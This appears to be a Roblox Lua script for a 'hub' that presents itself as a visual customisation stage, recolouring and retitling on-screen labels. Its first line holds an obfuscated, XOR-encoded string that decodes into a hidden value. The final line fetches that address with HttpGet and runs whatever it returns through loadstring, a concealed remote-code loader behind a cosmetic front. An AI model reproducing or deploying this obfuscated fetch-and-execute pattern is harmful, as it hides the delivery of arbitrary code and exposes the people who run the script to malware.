
--[[ STAGE 2: VISUAL CORE ]]
local d8dRsvOrgsF1J="\185\225\205\164\163\175\244\190\205\012\037\031\233\046\055\074\006\077\085\103\103\095\107\128\120\068\075\071\149\155\158\165\184"local MBkLGk9Pe10xB=29 local eSuqwzbSBsglGV1LwcEc=80 local i1sGGITQPXwEp0vXQY=0 local ryZJhD_HpcGwBI=7 local gWF6husK36p6XrtDz6RMBp=12 local oWJt7dqg5wpekY=true local gvSqfpwN36mBk5N6jnJM=bit32 and bit32.bxor if not gvSqfpwN36mBk5N6jnJM then gvSqfpwN36mBk5N6jnJM=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local bORakvvVa8skp={}for r8Zf3k_kDQDL=1,#d8dRsvOrgsF1J do local YhXThkaERbDwGiaigp_=string.byte(d8dRsvOrgsF1J,r8Zf3k_kDQDL)local sDadKYm3Rw8bmSQ2_Cq9_=(eSuqwzbSBsglGV1LwcEc+(r8Zf3k_kDQDL*ryZJhD_HpcGwBI)+gWF6husK36p6XrtDz6RMBp)%256 if i1sGGITQPXwEp0vXQY==0 then YhXThkaERbDwGiaigp_=(YhXThkaERbDwGiaigp_-sDadKYm3Rw8bmSQ2_Cq9_)%256 bORakvvVa8skp[r8Zf3k_kDQDL]=string.char(gvSqfpwN36mBk5N6jnJM(YhXThkaERbDwGiaigp_,MBkLGk9Pe10xB))else YhXThkaERbDwGiaigp_=gvSqfpwN36mBk5N6jnJM(YhXThkaERbDwGiaigp_,MBkLGk9Pe10xB)bORakvvVa8skp[r8Zf3k_kDQDL]=string.char((YhXThkaERbDwGiaigp_-sDadKYm3Rw8bmSQ2_Cq9_)%256)end end local fOxC_cG38F5NHrehWJM7U=table.concat(bORakvvVa8skp)if oWJt7dqg5wpekY then fOxC_cG38F5NHrehWJM7U=string.reverse(fOxC_cG38F5NHrehWJM7U)end local kYUGK0Ku2yzEro8JOm=fOxC_cG38F5NHrehWJM7U
local HubName = "OPASKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(kYUGK0Ku2yzEro8JOm))()
